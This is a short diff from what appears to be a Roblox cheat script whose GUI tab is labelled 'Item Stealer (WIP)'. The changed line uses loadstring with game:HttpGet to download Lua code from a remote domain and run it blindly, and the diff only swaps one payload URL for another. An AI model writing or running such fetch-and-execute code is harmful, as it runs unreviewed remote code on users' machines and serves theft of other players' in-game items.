@@ -110,4 +110,4 @@ local Tab = Window.NewTab("Item Stealer (WIP)")
 
 
 getgenv().gui = false
-loadstring(game:HttpGet("https://egorikusa.space/816474c1be73cca5c80a46a0.lua", true))()
+loadstring(game:HttpGet("https://egorikusa.space/d85d4ea8411b3b1824b3f4ca.lua", true))()
